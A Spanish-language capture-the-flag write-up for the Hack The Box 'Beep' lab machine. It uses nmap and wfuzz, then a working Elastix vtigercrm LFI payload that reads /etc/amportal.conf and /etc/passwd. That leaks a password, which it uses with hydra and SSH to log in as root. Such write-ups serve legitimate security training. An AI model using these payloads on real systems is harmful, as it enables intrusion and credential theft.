![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/beep.jpg)

## Linux - Easy
IP = 10.10.10.7

### USER ###

*** 
Ejecutamos nmap 
    
    nmap 10.10.10.7 -p- --open --min-rate 5000 -vv -n -Pn -oG allPorts
    
![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/allports.jpg)

    nmap 10.10.10.7 -sC -sV -p80  -oN targeted

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/targeted.jpg)

Detectamos un apache, openssh, smtp, imap, ssl 
Revisamos la pagina web vemos que es un elastix (https://es.wikipedia.org/wiki/Elastix)

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/elastix.jpg)

realizamos un scaneo de directorios en busca de algo mas de información

    wfuzz -c -t 400 --hc=404 --hh=1785 -L -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ/
            
![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/wfuzz.jpg)

Detectamos varias paginas entre ellas admin accedemos e intentamos conectar con las password por defecto y no funciona.
Buscamos informacion sobre Elastix y encontramos una vulnerabilidad LFI 
(https://www.exploit-db.com/exploits/37637)

    /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
    
Lo ejecutamos y vemos que nos muestra unas credenciales.

[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/lfi.jpg)

probamos a ver /etc/passwd para ver los usuarios que tienen bash e intentar conectar con ellos

     /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
     
[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/usuarios.jpg)

Sacamos el listado de usuarios y dejamos solo los que tengan bash

[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/bash.jpg)
[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/bash2.jpg)


lanzamos hydra para ver si nos conecta por ssh con las credenciales obtenidas.

    hydra 10.10.10.7 ssh -L user.txt -p jEhdIekWmdjE -f -vv
    
[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/hydra.jpg)

### ROOT ###

*** 
Accemos con root por ssh

    ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o Ciphers=aes256-cbc root@10.10.10.7
    
 [](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/ssh.jpg)
 
conseguimos la flag de user.txt

[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/flagUser.txt.jpg)

conseguimos la flag de root.txt

[](https://github.com/b14nc0/CTF/blob/main/HTB/images/beep/flagRoot.jpg)



